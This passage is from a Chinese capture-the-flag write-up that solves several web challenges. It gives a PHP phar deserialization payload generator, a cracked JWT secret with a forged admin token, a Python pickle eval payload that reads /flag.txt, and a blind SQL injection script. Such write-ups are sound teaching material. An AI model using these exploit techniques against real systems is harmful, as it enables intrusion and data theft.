class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>User类中的析构函数中有执行close()函数过程</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $db;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> $db;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;db = $db;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    ...</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;db-&gt;close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileList</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $files;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $results;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $funcs;</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($path)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;files = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;results = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;funcs = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        $filenames = scandir($path);</span><br><span class=\"line\"></span><br><span class=\"line\">        $key = array_search(<span class=\"string\">\".\"</span>, $filenames);</span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($filenames[$key]);   <span class=\"comment\">//销毁变量</span></span><br><span class=\"line\">        $key = array_search(<span class=\"string\">\"..\"</span>, $filenames);</span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($filenames[$key]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($filenames <span class=\"keyword\">as</span> $filename) &#123;</span><br><span class=\"line\">            $file = <span class=\"keyword\">new</span> File();</span><br><span class=\"line\">            $file-&gt;open($path . $filename);</span><br><span class=\"line\">            array_push(<span class=\"keyword\">$this</span>-&gt;files, $file);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;results[$file-&gt;name()] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($func, $args)</span> </span>&#123;  <span class=\"comment\">//调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span></span><br><span class=\"line\">        array_push(<span class=\"keyword\">$this</span>-&gt;funcs, $func);   </span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;files <span class=\"keyword\">as</span> $file) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"[https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96](https://www.cnblogs.com/20175211lyz/p/11403397.html#六phar反序列化)\">关于php反序列化</a>在刷题记录11当中也有两篇关于phar的文章<a href=\"https://paper.seebug.org/680/\" target=\"_blank\" rel=\"noopener\">参考文章1</a>     <a href=\"https://xz.aliyun.com/t/2958\" target=\"_blank\" rel=\"noopener\">参考文章2</a></p>\n<p>重点在class.php，delete.php，和download.php中</p>\n<p>在delete.php、download.php中file_exists会触发phar反序列化漏洞，但是在download.php有设置open_basedir，而delete.php中没有，所以选择delete.php</p>\n<p>编写生成phar的脚本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $db;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileList</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $files;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $results;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $funcs;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $file = <span class=\"keyword\">new</span> File();</span><br><span class=\"line\">        $file-&gt;filename=<span class=\"string\">\"/flag.txt\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;files=<span class=\"keyword\">array</span>($file);</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __destruct() method.</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$test = <span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$test-&gt;db = <span class=\"keyword\">new</span> FileList();</span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'s.phar'</span>);</span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;setStub(<span class=\"string\">\"GIF89a __HALT_COMPILER();\"</span>);</span><br><span class=\"line\">$phar-&gt;setMetadata($test);</span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>);</span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>\n\n<p>将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为<code>phar://s.gif</code></p>\n<p><img src=\"/pic/74.png\" alt=\"\"></p>\n<h2 id=\"华北赛区-Day1-Web2-ikun\"><a href=\"#华北赛区-Day1-Web2-ikun\" class=\"headerlink\" title=\"华北赛区 Day1 Web2 ikun\"></a>华北赛区 Day1 Web2 ikun</h2><p>打开题目有注册界面，先注册，登入</p>\n<p>回到首页发现要买到LV6</p>\n<p><img src=\"/pic/75.png\" alt=\"\"></p>\n<p>在第181页找到了LV6点击购买</p>\n<p><img src=\"/pic/76.png\" alt=\"\"></p>\n<p>抓包发现有一个价格，有一个折扣</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/shopcar</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 106</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn/shopcar</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: _xsrf=2|578fed8a|97f2448968d2a525b9b0490c07c3413f|1581661272; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78; commodity_id=\"2|1:0|10:1581662353|12:commodity_id|8:MTYyNA==|e3649aa3872d333d61bd8b14770c0c7ca9c0539d9263777c505ebe2ac3e7e15f\"</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">_xsrf=2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&amp;id=1624&amp;price=1145141919.0&amp;discount=0.8</span><br></pre></td></tr></table></figure>\n\n<p>把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问</p>\n<p><img src=\"/pic/77.png\" alt=\"\"></p>\n<p><img src=\"/pic/78.png\" alt=\"\"></p>\n<p>查看cookie，其中有一个JWT、_xsrf、commodity_id</p>\n<p><a href=\"https://blog.csdn.net/hekewangzi/article/details/72885670\" target=\"_blank\" rel=\"noopener\">关于JWT</a>   去jwt.io解析一下</p>\n<p><img src=\"/pic/79.png\" alt=\"\"></p>\n<p>使用的是HS256（HMAC SHA256对称加密）算法</p>\n<p>使用c-jwt-cracker破解成功，密钥为1Kun</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/tools/c-jwt-cracker<span class=\"comment\"># ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78</span></span><br><span class=\"line\">Secret is <span class=\"string\">\"1Kun\"</span></span><br></pre></td></tr></table></figure>\n\n<p>回到<a href=\"https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun\" target=\"_blank\" rel=\"noopener\">https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun</a></p>\n<p><img src=\"/pic/80.png\" alt=\"\">  </p>\n<p>然后修改cookie为<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p>\n<p><img src=\"/pic/81.png\" alt=\"\">  </p>\n<p>点击页面无反应，查看源码，发现了一个WWW.ZIP</p>\n<p><img src=\"/pic/82.png\" alt=\"\">  </p>\n<p>打开发现是tornado的框架</p>\n<p>既然PHP有序列化漏洞，python也有，通过pickle模块实现 [参考文章]（<a href=\"https://www.jianshu.com/p/8fd3de5b4843）\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/8fd3de5b4843）</a></p>\n<p>在sshop/view/Admin.py中含有序列化漏洞</p>\n<p><img src=\"/pic/83.png\" alt=\"\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> tornado.web</span><br><span class=\"line\"><span class=\"keyword\">from</span> sshop.base <span class=\"keyword\">import</span> BaseHandler</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AdminHandler</span><span class=\"params\">(BaseHandler)</span>:</span></span><br><span class=\"line\"><span class=\"meta\">    @tornado.web.authenticated</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(self, *args, **kwargs)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.current_user == <span class=\"string\">\"admin\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'form.html'</span>, res=<span class=\"string\">'This is Black Technology!'</span>, member=<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'no_ass.html'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @tornado.web.authenticated</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(self, *args, **kwargs)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            become = self.get_argument(<span class=\"string\">'become'</span>)</span><br><span class=\"line\">            p = pickle.loads(urllib.unquote(become))     </span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'form.html'</span>, res=p, member=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'form.html'</span>, res=<span class=\"string\">'This is Black Technology!'</span>, member=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>编写exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__reduce__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> eval,(<span class=\"string\">\"open('/flag.txt','r').read()\"</span>,)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    a = test()</span><br><span class=\"line\">    payload = pickle.dumps(a)</span><br><span class=\"line\">    print(urllib.quote(payload))  <span class=\"comment\">#c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure>\n\n<p>在/b1g_m4mber界面点击一键成为大会员</p>\n<p>在BP中修改post中的become数据</p>\n<p><img src=\"/pic/84.png\" alt=\"\"></p>\n<h2 id=\"总决赛-Day2-Web1-Easyweb\"><a href=\"#总决赛-Day2-Web1-Easyweb\" class=\"headerlink\" title=\"总决赛 Day2 Web1 Easyweb\"></a>总决赛 Day2 Web1 Easyweb</h2><p>打开又是一个登入界面，访问robots.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>在登入界面登入后有一个get /image.php?id=1请求</p>\n<p>访问/image.php.bak得到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;﻿?php</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"config.php\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$id=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"id\"</span>])?$_GET[<span class=\"string\">\"id\"</span>]:<span class=\"string\">\"1\"</span>;</span><br><span class=\"line\">$path=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"path\"</span>])?$_GET[<span class=\"string\">\"path\"</span>]:<span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$id=addslashes($id);</span><br><span class=\"line\">$path=addslashes($path);</span><br><span class=\"line\"></span><br><span class=\"line\">$id=str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">\"\\\\0\"</span>,<span class=\"string\">\"%00\"</span>,<span class=\"string\">\"\\\\'\"</span>,<span class=\"string\">\"'\"</span>),<span class=\"string\">\"\"</span>,$id);</span><br><span class=\"line\">$path=str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">\"\\\\0\"</span>,<span class=\"string\">\"%00\"</span>,<span class=\"string\">\"\\\\'\"</span>,<span class=\"string\">\"'\"</span>),<span class=\"string\">\"\"</span>,$path); </span><br><span class=\"line\"></span><br><span class=\"line\">$result=mysqli_query($con,<span class=\"string\">\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\"</span>);</span><br><span class=\"line\">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class=\"line\"></span><br><span class=\"line\">$path=<span class=\"string\">\"./\"</span> . $row[<span class=\"string\">\"path\"</span>];</span><br><span class=\"line\">header(<span class=\"string\">\"Content-Type: image/jpeg\"</span>);</span><br><span class=\"line\">readfile($path);</span><br></pre></td></tr></table></figure>\n\n<p>addslashes() 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（<em>‘</em>）、双引号（<em>“</em>）、反斜线（<em>\\</em>）与 NUL（<strong><code>NULL</code></strong> 字符）。</p>\n<p>因为单引号被过滤，刚好又有两个变量，id后面的单引号被转义后，path后面输入的内容就会被当作语句执行，然后把path后面的单引号注释掉就不会报错了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;select * from images where id&#x3D;&#39;\\&#39; or path&#x3D;&#39;$path&#39;&quot;    -&gt;</span><br><span class=\"line\">&quot;select * from images where id&#x3D;&#39; or path&#x3D;&#39; $path &quot;</span><br></pre></td></tr></table></figure>\n\n<p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/14/2020 8:39 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    hexs=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(strs)):</span><br><span class=\"line\">        hexs+=hex(ord(strs[x]))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    print(hexs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://48e2e973-9423-4d4e-b6ff-0e79cf4c1a5f.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or id=('</span>+payload+<span class=\"string\">')--+'</span></span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"if(ascii(substr((%s),%d,1))&gt;%d,1,0)\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html,'*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'F'</span>  <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tables</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    db=str2hex(db)</span><br><span class=\"line\">    s_payload = <span 